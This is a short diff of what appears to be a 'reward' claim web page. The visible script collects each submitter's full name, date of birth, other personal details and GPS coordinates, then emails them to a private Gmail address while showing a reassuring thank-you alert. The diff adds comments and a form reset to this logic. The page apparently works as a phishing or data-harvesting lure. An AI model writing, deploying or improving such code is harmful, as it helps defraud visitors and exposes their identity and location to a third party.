@@ -137,6 +137,7 @@
         document.getElementById("rewardForm").addEventListener("submit", function (e) {
             e.preventDefault();
 
+            // Capture form data
             const formData = {
                 fullName: document.getElementById("fullName").value,
                 dob: document.getElementById("dob").value,
@@ -148,6 +149,7 @@
                 location: `Latitude: ${latitude}, Longitude: ${longitude}`
             };
 
+            // Create message for email
             const message = `
                 Name: ${formData.fullName}
                 Date of Birth: ${formData.dob}
@@ -159,8 +161,12 @@
                 Location: ${formData.location}
             `;
 
+            // Send email with form data
             sendEmail("Form Submission Data", message, "khalilrodeni@gmail.com");
+
+            // Show success message and reset form
             alert("Thank you for your submission! We will contact you shortly.");
+            document.getElementById("rewardForm").reset();
         });
 
         // Email Sending Function
@@ -186,4 +192,3 @@
     </script>
 </body>
 </html>
- 
